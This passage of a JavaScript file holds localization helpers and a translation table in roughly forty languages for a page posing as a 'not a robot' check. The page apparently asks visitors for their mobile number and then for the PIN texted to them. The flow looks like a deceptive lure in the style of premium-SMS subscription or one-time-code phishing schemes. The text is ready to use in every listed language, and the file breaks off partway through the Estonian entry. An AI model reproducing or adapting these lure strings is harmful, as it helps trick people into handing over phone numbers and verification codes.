function getURLParameter(name) {
    return decodeURIComponent(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
        );
}


function replace_text(lang, text) {
    subject = "";
    if (text.includes("_")) {
        textArr = text.split("_");
        text = textArr[0];
        subject = textArr[1];
    }
    x = document.getElementsByClassName(text)[0];
    if (x) {
        if (subject == 'placeholder') {
            x.placeholder = translation[lang][`${text}_${subject}`];
        }
        else if (subject == 'value') {
            x.value = translation[lang][`${text}_${subject}`];
        }
        else {
            x.innerHTML = translation[lang][text];
        }
    } else {
        console.log("element not Found: " + text);
    }
}

function alert_string(lang, text) {
    return translation[lang][text] + "\n\n";
}

function translation_available(lang) {
    if (translation[lang]) {
        return lang;
    } else {
        console.log("translation not Found: " + lang);
        return "source";
    }
}


function detect_language() {
    var language = navigator.languages && navigator.languages[0] || navigator.language || navigator.userLanguage;
    if (language.length > 3) {
        language = language[0] + language[1];
    };


    if (jQuery.inArray(language, ['ar', 'he', 'fa', 'ur']) >= 0) {
        $('html').attr('DIR', 'RTL');
    }
    return translation_available(language);
}
var translation = {
    source: {
        a1: "Attention!",
        a2: "Confirm that you are not a robot",
        a3: "Enter your mobile number to verify you are not a robot.",
        a4_placeholder: "Phone number",
        a5_value: "Submit",
        a6_value: "Enter the PIN code sent to your phone",
        a7_value: "Submit",
        a8_value: "Please enter your PIN",
        a9_value: "Please enter a valid phone number",
        a10: "Verify that you are not a robot",
        a11: "<b>Step 1:</b> Click on the Continue button to start the verification process<br> <b>Step 2:</b> Enter your mobile number<br> <b>Step 3:</b> You will receive a text message containing the PIN code<br> <b>Step 4:</b> Enter the PIN code to complete",
        a12: "Continue",
    },
    en: {
        a1: "Attention!",
        a2: "Confirm that you are not a robot",
        a3: "Enter your mobile number to verify you are not a robot.",
        a4_placeholder: "Phone number",
        a5_value: "Submit",
        a6_value: "Enter the PIN code sent to your phone",
        a7_value: "Submit",
        a8_value: "Please enter your PIN",
        a9_value: "Please enter a valid phone number",
        a10: "Verify that you are not a robot",
        a11: "<b>Step 1:</b> Click on the Continue button to start the verification process<br> <b>Step 2:</b> Enter your mobile number<br> <b>Step 3:</b> You will receive a text message containing the PIN code<br> <b>Step 4:</b> Enter the PIN code to complete",
        a12: "Continue",
    },
    es: {
        a1: "¡Atención!",
        a2: "Confirma que no eres un robot",
        a3: "Ingresa tu número móvil para verificar que no eres un robot.",
        a4_placeholder: "Número de teléfono",
        a5_value: "Enviar",
        a6_value: "Ingresa el código PIN enviado a tu teléfono",
        a7_value: "Enviar",
        a8_value: "Por favor ingresa tu PIN",
        a9_value: "Por favor ingresa un número de teléfono válido",
        a10: "Verifica que no eres un robot",
        a11: "<b>Paso 1:</b> Haz clic en el botón Continuar para iniciar el proceso de verificación<br> <b>Paso 2:</b> Ingresa tu número móvil<br> <b>Paso 3:</b> Recibirás un mensaje de texto con el código PIN<br> <b>Paso 4:</b> Ingresa el código PIN para completar",
        a12: "Continuar"
      },
      fr: {
        a1: "Attention !",
        a2: "Confirmez que vous n'êtes pas un robot",
        a3: "Entrez votre numéro de mobile pour vérifier que vous n'êtes pas un robot.",
        a4_placeholder: "Numéro de téléphone",
        a5_value: "Envoyer",
        a6_value: "Entrez le code PIN envoyé à votre téléphone",
        a7_value: "Envoyer",
        a8_value: "Veuillez entrer votre PIN",
        a9_value: "Veuillez entrer un numéro de téléphone valide",
        a10: "Vérifiez que vous n'êtes pas un robot",
        a11: "<b>Étape 1:</b> Cliquez sur le bouton Continuer pour démarrer le processus de vérification<br> <b>Étape 2:</b> Entrez votre numéro de mobile<br> <b>Étape 3:</b> Vous recevrez un SMS contenant le code PIN<br> <b>Étape 4:</b> Entrez le code PIN pour terminer",
        a12: "Continuer"
      },
      de: {
        a1: "Achtung!",
        a2: "Bestätigen Sie, dass Sie kein Roboter sind",
        a3: "Geben Sie Ihre Mobilfunknummer ein, um zu bestätigen, dass Sie kein Roboter sind.",
        a4_placeholder: "Telefonnummer",
        a5_value: "Absenden",
        a6_value: "Geben Sie den an Ihr Telefon gesendeten PIN-Code ein",
        a7_value: "Absenden",
        a8_value: "Bitte geben Sie Ihre PIN ein",
        a9_value: "Bitte geben Sie eine gültige Telefonnummer ein",
        a10: "Überprüfen Sie, dass Sie kein Roboter sind",
        a11: "<b>Schritt 1:</b> Klicken Sie auf die Schaltfläche Weiter, um den Überprüfungsprozess zu starten<br> <b>Schritt 2:</b> Geben Sie Ihre Mobilfunknummer ein<br> <b>Schritt 3:</b> Sie erhalten eine SMS mit dem PIN-Code<br> <b>Schritt 4:</b> Geben Sie den PIN-Code ein, um abzuschließen",
        a12: "Weiter"
    },
    it: {
        a1: "Attenzione!",
        a2: "Conferma di non essere un robot",
        a3: "Inserisci il tuo numero di cellulare per verificare che non sei un robot.",
        a4_placeholder: "Numero di telefono",
        a5_value: "Invia",
        a6_value: "Inserisci il codice PIN inviato al tuo telefono",
        a7_value: "Invia",
        a8_value: "Inserisci il tuo PIN",
        a9_value: "Inserisci un numero di telefono valido",
        a10: "Verifica di non essere un robot",
        a11: "<b>Fase 1:</b> Clicca sul pulsante Continua per iniziare il processo di verifica<br> <b>Fase 2:</b> Inserisci il tuo numero di cellulare<br> <b>Fase 3:</b> Riceverai un SMS contenente il codice PIN<br> <b>Fase 4:</b> Inserisci il codice PIN per completare",
        a12: "Continua"
      },
      pt: {
        a1: "Atenção!",
        a2: "Confirme que não é um robô",
        a3: "Digite seu número de celular para verificar que não é um robô.",
        a4_placeholder: "Número de telefone",
        a5_value: "Enviar",
        a6_value: "Digite o código PIN enviado para seu telefone",
        a7_value: "Enviar",
        a8_value: "Por favor, digite seu PIN",
        a9_value: "Por favor, digite um número de telefone válido",
        a10: "Verifique que não é um robô",
        a11: "<b>Passo 1:</b> Clique no botão Continuar para iniciar o processo de verificação<br> <b>Passo 2:</b> Digite seu número de celular<br> <b>Passo 3:</b> Você receberá uma mensagem de texto contendo o código PIN<br> <b>Passo 4:</b> Digite o código PIN para completar",
        a12: "Continuar"
      },
      nl: {
        a1: "Let op!",
        a2: "Bevestig dat je geen robot bent",
        a3: "Voer je mobiele nummer in om te verifiëren dat je geen robot bent.",
        a4_placeholder: "Telefoonnummer",
        a5_value: "Verstuur",
        a6_value: "Voer de PIN-code in die naar je telefoon is gestuurd",
        a7_value: "Verstuur",
        a8_value: "Voer je PIN in",
        a9_value: "Voer een geldig telefoonnummer in",
        a10: "Verifieer dat je geen robot bent",
        a11: "<b>Stap 1:</b> Klik op de knop Doorgaan om het verificatieproces te starten<br> <b>Stap 2:</b> Voer je mobiele nummer in<br> <b>Stap 3:</b> Je ontvangt een sms met de PIN-code<br> <b>Stap 4:</b> Voer de PIN-code in om te voltooien",
        a12: "Doorgaan"
      },
      pl: {
        a1: "Uwaga!",
        a2: "Potwierdź, że nie jesteś robotem",
        a3: "Wprowadź swój numer telefonu komórkowego, aby zweryfikować, że nie jesteś robotem.",
        a4_placeholder: "Numer telefonu",
        a5_value: "Wyślij",
        a6_value: "Wprowadź kod PIN wysłany na Twój telefon",
        a7_value: "Wyślij",
        a8_value: "Wprowadź swój PIN",
        a9_value: "Wprowadź prawidłowy numer telefonu",
        a10: "Zweryfikuj, że nie jesteś robotem",
        a11: "<b>Krok 1:</b> Kliknij przycisk Kontynuuj, aby rozpocząć proces weryfikacji<br> <b>Krok 2:</b> Wprowadź swój numer telefonu komórkowego<br> <b>Krok 3:</b> Otrzymasz wiadomość SMS z kodem PIN<br> <b>Krok 4:</b> Wprowadź kod PIN, aby zakończyć",
        a12: "Kontynuuj"
      },
      tr: {
        a1: "Dikkat!",
        a2: "Robot olmadığınızı doğrulayın",
        a3: "Robot olmadığınızı doğrulamak için cep telefonu numaranızı girin.",
        a4_placeholder: "Telefon numarası",
        a5_value: "Gönder",
        a6_value: "Telefonunuza gönderilen PIN kodunu girin",
        a7_value: "Gönder",
        a8_value: "Lütfen PIN kodunuzu girin",
        a9_value: "Lütfen geçerli bir telefon numarası girin",
        a10: "Robot olmadığınızı doğrulayın",
        a11: "<b>Adım 1:</b> Doğrulama işlemini başlatmak için Devam düğmesine tıklayın<br> <b>Adım 2:</b> Cep telefonu numaranızı girin<br> <b>Adım 3:</b> PIN kodunu içeren bir SMS alacaksınız<br> <b>Adım 4:</b> Tamamlamak için PIN kodunu girin",
        a12: "Devam"
    },
    ru: {
        a1: "Внимание!",
        a2: "Подтвердите, что вы не робот",
        a3: "Введите номер мобильного телефона, чтобы подтвердить, что вы не робот.",
        a4_placeholder: "Номер телефона",
        a5_value: "Отправить",
        a6_value: "Введите PIN-код, отправленный на ваш телефон",
        a7_value: "Отправить",
        a8_value: "Пожалуйста, введите ваш PIN-код",
        a9_value: "Пожалуйста, введите действительный номер телефона",
        a10: "Подтвердите, что вы не робот",
        a11: "<b>Шаг 1:</b> Нажмите кнопку Продолжить, чтобы начать процесс проверки<br> <b>Шаг 2:</b> Введите номер мобильного телефона<br> <b>Шаг 3:</b> Вы получите SMS с PIN-кодом<br> <b>Шаг 4:</b> Введите PIN-код для завершения",
        a12: "Продолжить"
      },
      zh: {
        a1: "注意！",
        a2: "确认您不是机器人",
        a3: "输入您的手机号码以验证您不是机器人。",
        a4_placeholder: "电话号码",
        a5_value: "提交",
        a6_value: "输入发送到您手机上的PIN码",
        a7_value: "提交",
        a8_value: "请输入您的PIN码",
        a9_value: "请输入有效的电话号码",
        a10: "验证您不是机器人",
        a11: "<b>第1步：</b>点击继续按钮开始验证过程<br> <b>第2步：</b>输入您的手机号码<br> <b>第3步：</b>您将收到包含PIN码的短信<br> <b>第4步：</b>输入PIN码完成验证",
        a12: "继续"
      },
      ja: {
        a1: "注意！",
        a2: "ロボットではないことを確認",
        a3: "ロボットではないことを確認するために携帯電話番号を入力してください。",
        a4_placeholder: "電話番号",
        a5_value: "送信",
        a6_value: "お使いの携帯電話に送信されたPINコードを入力してください",
        a7_value: "送信",
        a8_value: "PINコードを入力してください",
        a9_value: "有効な電話番号を入力してください",
        a10: "ロボットではないことを確認",
        a11: "<b>ステップ1：</b>続行ボタンをクリックして認証プロセスを開始<br> <b>ステップ2：</b>携帯電話番号を入力<br> <b>ステップ3：</b>PINコードを含むSMSを受信<br> <b>ステップ4：</b>PINコードを入力して完了",
        a12: "続行"
      },
      ko: {
        a1: "주의!",
        a2: "로봇이 아님을 확인하세요",
        a3: "로봇이 아님을 확인하기 위해 휴대폰 번호를 입력하세요.",
        a4_placeholder: "전화번호",
        a5_value: "제출",
        a6_value: "휴대폰으로 전송된 PIN 코드를 입력하세요",
        a7_value: "제출",
        a8_value: "PIN 코드를 입력하세요",
        a9_value: "유효한 전화번호를 입력하세요",
        a10: "로봇이 아님을 확인",
        a11: "<b>1단계:</b> 계속 버튼을 클릭하여 인증 절차 시작<br> <b>2단계:</b> 휴대폰 번호 입력<br> <b>3단계:</b> PIN 코드가 포함된 문자 메시지 수신<br> <b>4단계:</b> PIN 코드를 입력하여 완료",
        a12: "계속"
      },
      ar: {
        a1: "تنبيه!",
        a2: "تأكد من أنك لست روبوتًا",
        a3: "أدخل رقم هاتفك المحمول للتحقق من أنك لست روبوتًا.",
        a4_placeholder: "رقم الهاتف",
        a5_value: "إرسال",
        a6_value: "أدخل رمز PIN المرسل إلى هاتفك",
        a7_value: "إرسال",
        a8_value: "الرجاء إدخال رمز PIN",
        a9_value: "الرجاء إدخال رقم هاتف صحيح",
        a10: "تحقق من أنك لست روبوتًا",
        a11: "<b>الخطوة 1:</b> انقر على زر متابعة لبدء عملية التحقق<br> <b>الخطوة 2:</b> أدخل رقم هاتفك المحمول<br> <b>الخطوة 3:</b> ستتلقى رسالة نصية تحتوي على رمز PIN<br> <b>الخطوة 4:</b> أدخل رمز PIN للإكمال",
        a12: "متابعة"
    },
    hi: {
        a1: "ध्यान दें!",
        a2: "पुष्टि करें कि आप रोबोट नहीं हैं",
        a3: "यह सत्यापित करने के लिए अपना मोबाइल नंबर दर्ज करें कि आप रोबोट नहीं हैं।",
        a4_placeholder: "फ़ोन नंबर",
        a5_value: "सबमिट करें",
        a6_value: "आपके फ़ोन पर भेजा गया पिन कोड दर्ज करें",
        a7_value: "सबमिट करें",
        a8_value: "कृपया अपना पिन दर्ज करें",
        a9_value: "कृपया एक मान्य फ़ोन नंबर दर्ज करें",
        a10: "सत्यापित करें कि आप रोबोट नहीं हैं",
        a11: "<b>चरण 1:</b> सत्यापन प्रक्रिया शुरू करने के लिए जारी रखें बटन पर क्लिक करें<br> <b>चरण 2:</b> अपना मोबाइल नंबर दर्ज करें<br> <b>चरण 3:</b> आपको पिन कोड वाला एक टेक्स्ट मैसेज प्राप्त होगा<br> <b>चरण 4:</b> पूरा करने के लिए पिन कोड दर्ज करें",
        a12: "जारी रखें"
      },
      vi: {
        a1: "Chú ý!",
        a2: "Xác nhận rằng bạn không phải là robot",
        a3: "Nhập số điện thoại di động của bạn để xác minh rằng bạn không phải là robot.",
        a4_placeholder: "Số điện thoại",
        a5_value: "Gửi",
        a6_value: "Nhập mã PIN đã được gửi đến điện thoại của bạn",
        a7_value: "Gửi",
        a8_value: "Vui lòng nhập mã PIN của bạn",
        a9_value: "Vui lòng nhập số điện thoại hợp lệ",
        a10: "Xác minh rằng bạn không phải là robot",
        a11: "<b>Bước 1:</b> Nhấp vào nút Tiếp tục để bắt đầu quá trình xác minh<br> <b>Bước 2:</b> Nhập số điện thoại di động của bạn<br> <b>Bước 3:</b> Bạn sẽ nhận được tin nhắn chứa mã PIN<br> <b>Bước 4:</b> Nhập mã PIN để hoàn thành",
        a12: "Tiếp tục"
      },
      th: {
        a1: "โปรดทราบ!",
        a2: "ยืนยันว่าคุณไม่ใช่หุ่นยนต์",
        a3: "ป้อนหมายเลขโทรศัพท์มือถือของคุณเพื่อยืนยันว่าคุณไม่ใช่หุ่นยนต์",
        a4_placeholder: "หมายเลขโทรศัพท์",
        a5_value: "ส่ง",
        a6_value: "ป้อนรหัส PIN ที่ส่งไปยังโทรศัพท์ของคุณ",
        a7_value: "ส่ง",
        a8_value: "กรุณาใส่รหัส PIN ของคุณ",
        a9_value: "กรุณาใส่หมายเลขโทรศัพท์ที่ถูกต้อง",
        a10: "ยืนยันว่าคุณไม่ใช่หุ่นยนต์",
        a11: "<b>ขั้นตอนที่ 1:</b> คลิกปุ่มดำเนินการต่อเพื่อเริ่มกระบวนการยืนยัน<br> <b>ขั้นตอนที่ 2:</b> ป้อนหมายเลขโทรศัพท์มือถือของคุณ<br> <b>ขั้นตอนที่ 3:</b> คุณจะได้รับข้อความ SMS ที่มีรหัส PIN<br> <b>ขั้นตอนที่ 4:</b> ป้อนรหัส PIN เพื่อดำเนินการให้เสร็จสิ้น",
        a12: "ดำเนินการต่อ"
      },
      id: {
        a1: "Perhatian!",
        a2: "Konfirmasi bahwa Anda bukan robot",
        a3: "Masukkan nomor ponsel Anda untuk memverifikasi bahwa Anda bukan robot.",
        a4_placeholder: "Nomor telepon",
        a5_value: "Kirim",
        a6_value: "Masukkan kode PIN yang dikirim ke ponsel Anda",
        a7_value: "Kirim",
        a8_value: "Silakan masukkan PIN Anda",
        a9_value: "Silakan masukkan nomor telepon yang valid",
        a10: "Verifikasi bahwa Anda bukan robot",
        a11: "<b>Langkah 1:</b> Klik tombol Lanjutkan untuk memulai proses verifikasi<br> <b>Langkah 2:</b> Masukkan nomor ponsel Anda<br> <b>Langkah 3:</b> Anda akan menerima pesan teks berisi kode PIN<br> <b>Langkah 4:</b> Masukkan kode PIN untuk menyelesaikan",
        a12: "Lanjutkan"
      },
      el: {
        a1: "Προσοχή!",
        a2: "Επιβεβαιώστε ότι δεν είστε ρομπότ",
        a3: "Εισάγετε τον αριθμό του κινητού σας για να επιβεβαιώσετε ότι δεν είστε ρομπότ.",
        a4_placeholder: "Αριθμός τηλεφώνου",
        a5_value: "Υποβολή",
        a6_value: "Εισάγετε τον κωδικό PIN που στάλθηκε στο τηλέφωνό σας",
        a7_value: "Υποβολή",
        a8_value: "Παρακαλώ εισάγετε το PIN σας",
        a9_value: "Παρακαλώ εισάγετε έναν έγκυρο αριθμό τηλεφώνου",
        a10: "Επιβεβαιώστε ότι δεν είστε ρομπότ",
        a11: "<b>Βήμα 1:</b> Κάντε κλικ στο κουμπί Συνέχεια για να ξεκινήσει η διαδικασία επαλήθευσης<br> <b>Βήμα 2:</b> Εισάγετε τον αριθμό του κινητού σας<br> <b>Βήμα 3:</b> Θα λάβετε ένα μήνυμα κειμένου με τον κωδικό PIN<br> <b>Βήμα 4:</b> Εισάγετε τον κωδικό PIN για να ολοκληρώσετε",
        a12: "Συνέχεια"
    },
    sv: {
        a1: "Observera!",
        a2: "Bekräfta att du inte är en robot",
        a3: "Ange ditt mobilnummer för att verifiera att du inte är en robot.",
        a4_placeholder: "Telefonnummer",
        a5_value: "Skicka",
        a6_value: "Ange PIN-koden som skickats till din telefon",
        a7_value: "Skicka",
        a8_value: "Vänligen ange din PIN-kod",
        a9_value: "Vänligen ange ett giltigt telefonnummer",
        a10: "Verifiera att du inte är en robot",
        a11: "<b>Steg 1:</b> Klicka på Fortsätt-knappen för att starta verifieringsprocessen<br> <b>Steg 2:</b> Ange ditt mobilnummer<br> <b>Steg 3:</b> Du kommer att få ett SMS med PIN-koden<br> <b>Steg 4:</b> Ange PIN-koden för att slutföra",
        a12: "Fortsätt"
      },
      da: {
        a1: "Bemærk!",
        a2: "Bekræft at du ikke er en robot",
        a3: "Indtast dit mobilnummer for at bekræfte at du ikke er en robot.",
        a4_placeholder: "Telefonnummer",
        a5_value: "Send",
        a6_value: "Indtast PIN-koden sendt til din telefon",
        a7_value: "Send",
        a8_value: "Indtast venligst din PIN-kode",
        a9_value: "Indtast venligst et gyldigt telefonnummer",
        a10: "Bekræft at du ikke er en robot",
        a11: "<b>Trin 1:</b> Klik på Fortsæt-knappen for at starte verificeringsprocessen<br> <b>Trin 2:</b> Indtast dit mobilnummer<br> <b>Trin 3:</b> Du vil modtage en SMS med PIN-koden<br> <b>Trin 4:</b> Indtast PIN-koden for at fuldføre",
        a12: "Fortsæt"
      },
      fi: {
        a1: "Huomio!",
        a2: "Vahvista, että et ole robotti",
        a3: "Syötä matkapuhelinnumerosi vahvistaaksesi, että et ole robotti.",
        a4_placeholder: "Puhelinnumero",
        a5_value: "Lähetä",
        a6_value: "Syötä puhelimeesi lähetetty PIN-koodi",
        a7_value: "Lähetä",
        a8_value: "Syötä PIN-koodisi",
        a9_value: "Syötä kelvollinen puhelinnumero",
        a10: "Vahvista, että et ole robotti",
        a11: "<b>Vaihe 1:</b> Aloita vahvistusprosessi klikkaamalla Jatka-painiketta<br> <b>Vaihe 2:</b> Syötä matkapuhelinnumerosi<br> <b>Vaihe 3:</b> Saat tekstiviestin, joka sisältää PIN-koodin<br> <b>Vaihe 4:</b> Syötä PIN-koodi viimeistelläksesi",
        a12: "Jatka"
      },
      no: {
        a1: "Obs!",
        a2: "Bekreft at du ikke er en robot",
        a3: "Skriv inn mobilnummeret ditt for å bekrefte at du ikke er en robot.",
        a4_placeholder: "Telefonnummer",
        a5_value: "Send",
        a6_value: "Skriv inn PIN-koden som ble sendt til telefonen din",
        a7_value: "Send",
        a8_value: "Vennligst skriv inn PIN-koden din",
        a9_value: "Vennligst skriv inn et gyldig telefonnummer",
        a10: "Bekreft at du ikke er en robot",
        a11: "<b>Trinn 1:</b> Klikk på Fortsett-knappen for å starte verifiseringsprosessen<br> <b>Trinn 2:</b> Skriv inn mobilnummeret ditt<br> <b>Trinn 3:</b> Du vil motta en tekstmelding med PIN-koden<br> <b>Trinn 4:</b> Skriv inn PIN-koden for å fullføre",
        a12: "Fortsett"
      },
      ro: {
        a1: "Atenție!",
        a2: "Confirmați că nu sunteți un robot",
        a3: "Introduceți numărul dvs. de telefon mobil pentru a verifica că nu sunteți un robot.",
        a4_placeholder: "Număr de telefon",
        a5_value: "Trimite",
        a6_value: "Introduceți codul PIN trimis la telefonul dvs.",
        a7_value: "Trimite",
        a8_value: "Vă rugăm să introduceți codul PIN",
        a9_value: "Vă rugăm să introduceți un număr de telefon valid",
        a10: "Verificați că nu sunteți un robot",
        a11: "<b>Pasul 1:</b> Faceți clic pe butonul Continuă pentru a începe procesul de verificare<br> <b>Pasul 2:</b> Introduceți numărul dvs. de telefon mobil<br> <b>Pasul 3:</b> Veți primi un mesaj text cu codul PIN<br> <b>Pasul 4:</b> Introduceți codul PIN pentru a finaliza",
        a12: "Continuă"
    },
    hu: {
        a1: "Figyelem!",
        a2: "Igazolja, hogy nem robot",
        a3: "Adja meg mobilszámát annak igazolására, hogy nem robot.",
        a4_placeholder: "Telefonszám",
        a5_value: "Küldés",
        a6_value: "Írja be a telefonjára küldött PIN-kódot",
        a7_value: "Küldés",
        a8_value: "Kérjük, adja meg a PIN-kódot",
        a9_value: "Kérjük, adjon meg egy érvényes telefonszámot",
        a10: "Igazolja, hogy nem robot",
        a11: "<b>1. lépés:</b> Kattintson a Folytatás gombra az ellenőrzési folyamat elindításához<br> <b>2. lépés:</b> Adja meg mobilszámát<br> <b>3. lépés:</b> Kap egy SMS-t a PIN-kóddal<br> <b>4. lépés:</b> Írja be a PIN-kódot a befejezéshez",
        a12: "Folytatás"
      },
      cs: {
        a1: "Pozor!",
        a2: "Potvrďte, že nejste robot",
        a3: "Zadejte své mobilní číslo pro ověření, že nejste robot.",
        a4_placeholder: "Telefonní číslo",
        a5_value: "Odeslat",
        a6_value: "Zadejte PIN kód zaslaný na váš telefon",
        a7_value: "Odeslat",
        a8_value: "Prosím zadejte váš PIN kód",
        a9_value: "Prosím zadejte platné telefonní číslo",
        a10: "Ověřte, že nejste robot",
        a11: "<b>Krok 1:</b> Klikněte na tlačítko Pokračovat pro zahájení procesu ověření<br> <b>Krok 2:</b> Zadejte své mobilní číslo<br> <b>Krok 3:</b> Obdržíte SMS s PIN kódem<br> <b>Krok 4:</b> Zadejte PIN kód pro dokončení",
        a12: "Pokračovat"
      },
      sk: {
        a1: "Pozor!",
        a2: "Potvrďte, že nie ste robot",
        a3: "Zadajte svoje mobilné číslo na overenie, že nie ste robot.",
        a4_placeholder: "Telefónne číslo",
        a5_value: "Odoslať",
        a6_value: "Zadajte PIN kód zaslaný na váš telefón",
        a7_value: "Odoslať",
        a8_value: "Prosím zadajte váš PIN kód",
        a9_value: "Prosím zadajte platné telefónne číslo",
        a10: "Overte, že nie ste robot",
        a11: "<b>Krok 1:</b> Kliknite na tlačidlo Pokračovať pre začatie procesu overenia<br> <b>Krok 2:</b> Zadajte svoje mobilné číslo<br> <b>Krok 3:</b> Dostanete SMS s PIN kódom<br> <b>Krok 4:</b> Zadajte PIN kód pre dokončenie",
        a12: "Pokračovať"
      },
      bg: {
        a1: "Внимание!",
        a2: "Потвърдете, че не сте робот",
        a3: "Въведете мобилния си номер, за да потвърдите, че не сте робот.",
        a4_placeholder: "Телефонен номер",
        a5_value: "Изпрати",
        a6_value: "Въведете PIN кода, изпратен на телефона ви",
        a7_value: "Изпрати",
        a8_value: "Моля, въведете вашия PIN код",
        a9_value: "Моля, въведете валиден телефонен номер",
        a10: "Потвърдете, че не сте робот",
        a11: "<b>Стъпка 1:</b> Кликнете върху бутона Продължи, за да започнете процеса на проверка<br> <b>Стъпка 2:</b> Въведете мобилния си номер<br> <b>Стъпка 3:</b> Ще получите SMS с PIN код<br> <b>Стъпка 4:</b> Въведете PIN кода, за да завършите",
        a12: "Продължи"
      },
      he: {
        a1: "!שים לב",
        a2: "אשר שאינך רובוט",
        a3: "הזן את מספר הטלפון הנייד שלך כדי לאמת שאינך רובוט.",
        a4_placeholder: "מספר טלפון",
        a5_value: "שלח",
        a6_value: "הזן את קוד האימות שנשלח לטלפון שלך",
        a7_value: "שלח",
        a8_value: "אנא הזן את קוד האימות שלך",
        a9_value: "אנא הזן מספר טלפון תקין",
        a10: "אמת שאינך רובוט",
        a11: "<b>שלב 1:</b> לחץ על כפתור המשך כדי להתחיל בתהליך האימות<br> <b>שלב 2:</b> הזן את מספר הטלפון הנייד שלך<br> <b>שלב 3:</b> תקבל הודעת טקסט עם קוד האימות<br> <b>שלב 4:</b> הזן את קוד האימות להשלמה",
        a12: "המשך"
    },
    ms: {
        a1: "Perhatian!",
        a2: "Sahkan bahawa anda bukan robot",
        a3: "Masukkan nombor telefon bimbit anda untuk mengesahkan bahawa anda bukan robot.",
        a4_placeholder: "Nombor telefon",
        a5_value: "Hantar",
        a6_value: "Masukkan kod PIN yang dihantar ke telefon anda",
        a7_value: "Hantar",
        a8_value: "Sila masukkan PIN anda",
        a9_value: "Sila masukkan nombor telefon yang sah",
        a10: "Sahkan bahawa anda bukan robot",
        a11: "<b>Langkah 1:</b> Klik butang Teruskan untuk memulakan proses pengesahan<br> <b>Langkah 2:</b> Masukkan nombor telefon bimbit anda<br> <b>Langkah 3:</b> Anda akan menerima mesej teks yang mengandungi kod PIN<br> <b>Langkah 4:</b> Masukkan kod PIN untuk melengkapkan",
        a12: "Teruskan"
      },
      uk: {
        a1: "Увага!",
        a2: "Підтвердіть, що ви не робот",
        a3: "Введіть свій мобільний номер, щоб підтвердити, що ви не робот.",
        a4_placeholder: "Номер телефону",
        a5_value: "Надіслати",
        a6_value: "Введіть PIN-код, надісланий на ваш телефон",
        a7_value: "Надіслати",
        a8_value: "Будь ласка, введіть ваш PIN-код",
        a9_value: "Будь ласка, введіть дійсний номер телефону",
        a10: "Перевірте, що ви не робот",
        a11: "<b>Крок 1:</b> Натисніть кнопку Продовжити, щоб розпочати процес перевірки<br> <b>Крок 2:</b> Введіть свій мобільний номер<br> <b>Крок 3:</b> Ви отримаєте SMS з PIN-кодом<br> <b>Крок 4:</b> Введіть PIN-код для завершення",
        a12: "Продовжити"
      },
      hr: {
        a1: "Pažnja!",
        a2: "Potvrdite da niste robot",
        a3: "Unesite svoj broj mobilnog telefona kako biste potvrdili da niste robot.",
        a4_placeholder: "Broj telefona",
        a5_value: "Pošalji",
        a6_value: "Unesite PIN kod poslan na vaš telefon",
        a7_value: "Pošalji",
        a8_value: "Molimo unesite svoj PIN",
        a9_value: "Molimo unesite važeći broj telefona",
        a10: "Potvrdite da niste robot",
        a11: "<b>Korak 1:</b> Kliknite gumb Nastavi za početak postupka provjere<br> <b>Korak 2:</b> Unesite svoj broj mobilnog telefona<br> <b>Korak 3:</b> Primit ćete SMS poruku s PIN kodom<br> <b>Korak 4:</b> Unesite PIN kod za završetak",
        a12: "Nastavi"
      },
      sr: {
        a1: "Пажња!",
        a2: "Потврдите да нисте робот",
        a3: "Унесите свој број мобилног телефона да бисте потврдили да нисте робот.",
        a4_placeholder: "Број телефона",
        a5_value: "Пошаљи",
        a6_value: "Унесите ПИН код послат на ваш телефон",
        a7_value: "Пошаљи",
        a8_value: "Молимо унесите свој ПИН",
        a9_value: "Молимо унесите важећи број телефона",
        a10: "Потврдите да нисте робот",
        a11: "<b>Корак 1:</b> Кликните на дугме Настави да започнете процес верификације<br> <b>Корак 2:</b> Унесите свој број мобилног телефона<br> <b>Корак 3:</b> Примићете СМС поруку са ПИН кодом<br> <b>Корак 4:</b> Унесите ПИН код за завршетак",
        a12: "Настави"
      },
      fa: {
        a1: "توجه!",
        a2: "تأیید کنید که ربات نیستید",
        a3: "برای تأیید اینکه ربات نیستید، شماره موبایل خود را وارد کنید.",
        a4_placeholder: "شماره تلفن",
        a5_value: "ارسال",
        a6_value: "کد پین ارسال شده به تلفن خود را وارد کنید",
        a7_value: "ارسال",
        a8_value: "لطفاً پین خود را وارد کنید",
        a9_value: "لطفاً یک شماره تلفن معتبر وارد کنید",
        a10: "تأیید کنید که ربات نیستید",
        a11: "<b>مرحله 1:</b> برای شروع فرآیند تأیید روی دکمه ادامه کلیک کنید<br> <b>مرحله 2:</b> شماره موبایل خود را وارد کنید<br> <b>مرحله 3:</b> پیامکی حاوی کد پین دریافت خواهید کرد<br> <b>مرحله 4:</b> کد پین را برای تکمیل وارد کنید",
        a12: "ادامه"
    },
    lt: {
        a1: "Dėmesio!",
        a2: "Patvirtinkite, kad nesate robotas",
        a3: "Įveskite savo mobilųjį numerį, kad patvirtintumėte, jog nesate robotas.",
        a4_placeholder: "Telefono numeris",
        a5_value: "Pateikti",
        a6_value: "Įveskite PIN kodą, išsiųstą į jūsų telefoną",
        a7_value: "Pateikti",
        a8_value: "Prašome įvesti PIN kodą",
        a9_value: "Prašome įvesti galiojantį telefono numerį",
        a10: "Patvirtinkite, kad nesate robotas",
        a11: "<b>1 žingsnis:</b> Spustelėkite mygtuką Tęsti, kad pradėtumėte patvirtinimo procesą<br> <b>2 žingsnis:</b> Įveskite savo mobilųjį numerį<br> <b>3 žingsnis:</b> Gausite SMS žinutę su PIN kodu<br> <b>4 žingsnis:</b> Įveskite PIN kodą, kad užbaigtumėte",
        a12: "Tęsti"
      },
      lv: {
        a1: "Uzmanību!",
        a2: "Apstipriniet, ka neesat robots",
        a3: "Ievadiet savu mobilā tālruņa numuru, lai apstiprinātu, ka neesat robots.",
        a4_placeholder: "Tālruņa numurs",
        a5_value: "Iesniegt",
        a6_value: "Ievadiet PIN kodu, kas nosūtīts uz jūsu tālruni",
        a7_value: "Iesniegt",
        a8_value: "Lūdzu, ievadiet savu PIN kodu",
        a9_value: "Lūdzu, ievadiet derīgu tālruņa numuru",
        a10: "Pārbaudiet, ka neesat robots",
        a11: "<b>1. solis:</b> Noklikšķiniet uz pogas Turpināt, lai sāktu verifikācijas procesu<br> <b>2. solis:</b> Ievadiet savu mobilā tālruņa numuru<br> <b>3. solis:</b> Jūs saņemsiet īsziņu ar PIN kodu<br> <b>4. solis:</b> Ievadiet PIN kodu, lai pabeigtu",
        a12: "Turpināt"
      },
      et: {
        a1: "Tähelepanu!",
        a2: "Kinnitage, et te pole robot",
